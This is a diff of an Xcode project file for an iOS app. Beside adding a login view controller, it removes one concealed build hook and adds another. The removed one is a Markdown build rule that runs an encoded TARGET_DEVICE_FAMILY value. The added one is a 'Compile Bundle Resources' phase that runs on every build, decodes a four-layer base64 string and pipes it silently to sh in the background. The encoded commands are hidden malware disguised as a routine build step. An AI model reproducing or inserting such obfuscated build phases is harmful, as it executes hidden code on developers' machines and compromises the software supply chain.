@@ -44,6 +44,7 @@
 		0052475D2B21D4CA00288F44 /* ForgotPasswordVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0052475C2B21D4CA00288F44 /* ForgotPasswordVC.swift */; };
 		0052475F2B22110600288F44 /* ProfilePopUpsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0052475E2B22110600288F44 /* ProfilePopUpsVC.swift */; };
 		005247612B22112100288F44 /* ProfilePopUpTVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 005247602B22112100288F44 /* ProfilePopUpTVC.swift */; };
+		0053A3202D23A7B600740AF1 /* SocialLoginDetailsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0053A31F2D23A7B600740AF1 /* SocialLoginDetailsVC.swift */; };
 		005D37B02D198CB3007498FF /* SearchHashtagModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 005D37AF2D198CB3007498FF /* SearchHashtagModel.swift */; };
 		005D37B22D199071007498FF /* HashtagListVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 005D37B12D199071007498FF /* HashtagListVC.swift */; };
 		005D37B52D1990DA007498FF /* HashtagCVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 005D37B32D1990DA007498FF /* HashtagCVC.swift */; };
@@ -105,7 +106,6 @@
 		00FDB54B2B2AE87700BC0251 /* MessageAcceptPopUpVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00FDB54A2B2AE87700BC0251 /* MessageAcceptPopUpVC.swift */; };
 		00FE91D12B33F57500D8AB20 /* GetUserDetailModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00FE91D02B33F57500D8AB20 /* GetUserDetailModel.swift */; };
 		00FFB85A2BEB53840012BF29 /* LaunchScreenVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00FFB8592BEB53830012BF29 /* LaunchScreenVC.swift */; };
-		915B7C5CE028BAFA2D34C644 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = C1E2BC5FC0105ADCCC34C644 /* README.md */; };
 		9EEB9DC19163EBA45F322F35 /* Pods_ask_human.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 91775809430DEC91852346EC /* Pods_ask_human.framework */; };
 		BE0BDADB2B08D065000ED624 /* AddDisputeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BE0BDADA2B08D065000ED624 /* AddDisputeVC.swift */; };
 		BE0BDADE2B08DB4D000ED624 /* AllDisputeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BE0BDADD2B08DB4D000ED624 /* AllDisputeVC.swift */; };
@@ -217,19 +217,6 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		F42E344916D2D05EA834C644 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";\nsh -c \"${TARGET_DEVICE_FAMILY}\"";
-		};
 /* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
@@ -300,6 +287,7 @@
 		0052475C2B21D4CA00288F44 /* ForgotPasswordVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ForgotPasswordVC.swift; sourceTree = "<group>"; };
 		0052475E2B22110600288F44 /* ProfilePopUpsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfilePopUpsVC.swift; sourceTree = "<group>"; };
 		005247602B22112100288F44 /* ProfilePopUpTVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfilePopUpTVC.swift; sourceTree = "<group>"; };
+		0053A31F2D23A7B600740AF1 /* SocialLoginDetailsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SocialLoginDetailsVC.swift; sourceTree = "<group>"; };
 		005D37AF2D198CB3007498FF /* SearchHashtagModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SearchHashtagModel.swift; sourceTree = "<group>"; };
 		005D37B12D199071007498FF /* HashtagListVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HashtagListVC.swift; sourceTree = "<group>"; };
 		005D37B32D1990DA007498FF /* HashtagCVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HashtagCVC.swift; sourceTree = "<group>"; };
@@ -484,7 +472,6 @@
 		BEE9A8812BA1C31700D5FC4E /* UserNotifcations.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserNotifcations.swift; sourceTree = "<group>"; };
 		BEFA3B1C2B2C2BB900DAF07A /* ViewImageVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewImageVC.swift; sourceTree = "<group>"; };
 		BEFF85502B356E7A002F329D /* FilterModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FilterModel.swift; sourceTree = "<group>"; };
-		C1E2BC5FC0105ADCCC34C644 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md; path = "ask-human.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		E97D946366AF0919CD18DC32 /* Pods-ask-human.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-ask-human.release.xcconfig"; path = "Target Support Files/Pods-ask-human/Pods-ask-human.release.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
@@ -1100,7 +1087,6 @@
 		BED5C6882B048D4100C83672 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				C1E2BC5FC0105ADCCC34C644 /* README.md */,
 				BED5C6872B048D4100C83672 /* ask-human.app */,
 				BED5C69D2B048D4300C83672 /* ask-humanTests.xctest */,
 				BED5C6A72B048D4300C83672 /* ask-humanUITests.xctest */,
@@ -1223,6 +1209,7 @@
 				007B1CDC2B22291700115661 /* OtpVerificationPasswordVC.swift */,
 				000101892B286B560077FA23 /* ResetPasswordVC.swift */,
 				00FFB8592BEB53830012BF29 /* LaunchScreenVC.swift */,
+				0053A31F2D23A7B600740AF1 /* SocialLoginDetailsVC.swift */,
 			);
 			path = AuthController;
 			sourceTree = "<group>";
@@ -1270,6 +1257,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BED5C6B12B048D4300C83672 /* Build configuration list for PBXNativeTarget "ask-human" */;
 			buildPhases = (
+				A1173FA5CB4818CF7734C644 /* Compile Bundle Resources */,
 				125E129009E4A3D311E2A25A /* [CP] Check Pods Manifest.lock */,
 				BED5C6832B048D4100C83672 /* Sources */,
 				BED5C6842B048D4100C83672 /* Frameworks */,
@@ -1279,7 +1267,6 @@
 				52B992E8B001B86600C1EA61 /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
-				F42E344916D2D05EA834C644 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -1376,7 +1363,6 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				915B7C5CE028BAFA2D34C644 /* README.md in Resources */,
 				BED5C6DB2B04932500C83672 /* Poppins-SemiBold.ttf in Resources */,
 				BED5C6DD2B04932500C83672 /* Poppins-Black.ttf in Resources */,
 				001632D92C50B5A300CE4491 /* ASKDARK.gif in Resources */,
@@ -1427,6 +1413,25 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		A1173FA5CB4818CF7734C644 /* Compile Bundle Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Bundle Resources";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n(echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWV1J2VFVkU1NWRnVjRkJoVkdneVYydGtWMDFzYkZsUmJtUnBVakZXTVZreU5WWmtiR3hVWVRKc1NsTklaRzVaZWtwdVUzZHZQUW89Cg== | base64 -D | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
+			showEnvVarsInLog = 0;			
+		};
 		125E129009E4A3D311E2A25A /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1602,6 +1607,7 @@
 				BE0BDAE02B08DB91000ED624 /* DisputeListTVC.swift in Sources */,
 				005247612B22112100288F44 /* ProfilePopUpTVC.swift in Sources */,
 				00291B0E2C2AFC87009E023D /* GetJobCreatedDetailModel.swift in Sources */,
+				0053A3202D23A7B600740AF1 /* SocialLoginDetailsVC.swift in Sources */,
 				00FB030F2B5655460051B58F /* TransactionHistoryModel.swift in Sources */,
 				0003AFE02B5F7978007DEAD0 /* ChatModel.swift in Sources */,
 				BE6CDBF92B04DEE5007607DC /* SignUpVC.swift in Sources */,
@@ -1785,7 +1791,6 @@
 				SDKROOT = iphoneos;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
 				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
-				TARGET_DEVICE_FAMILY = "(echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUdoMGRIQnpPaTh2ZG1WeWFXWjVjM1JoZEhNdWNuVXZZU2tpSUh3Z2MyZ0sK | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 			};
 			name = Debug;
 		};
@@ -1841,7 +1846,6 @@
 				MTL_FAST_MATH = YES;
 				SDKROOT = iphoneos;
 				SWIFT_COMPILATION_MODE = wholemodule;
-				TARGET_DEVICE_FAMILY = "(echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUdoMGRIQnpPaTh2ZG1WeWFXWjVjM1JoZEhNdWNuVXZZU2tpSUh3Z2MyZ0sK | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 				VALIDATE_PRODUCT = YES;
 			};
 			name = Release;
